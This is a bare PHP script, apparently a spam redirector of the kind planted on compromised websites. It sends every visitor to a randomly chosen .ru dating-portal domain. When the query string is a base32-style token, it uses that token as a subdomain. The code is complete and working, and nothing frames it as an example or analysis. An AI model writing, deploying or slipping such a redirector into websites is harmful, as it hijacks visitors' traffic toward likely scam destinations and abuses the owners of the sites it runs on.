<?php

$domains = array('reallydatingportal.ru', 'promtdatingportal.ru', 'datingportalworld.ru', 'datingportalalbum.ru', 'alldatingportal.ru');

$domain = $domains[array_rand($domains, 1)];
$url = ( preg_match('/^[a-z2-7]+$/', $_SERVER['QUERY_STRING']) ) ? sprintf("http://%s.%s", $_SERVER['QUERY_STRING'], $domain) : sprintf("http://%s", $domain);

header("Location: $url");

?>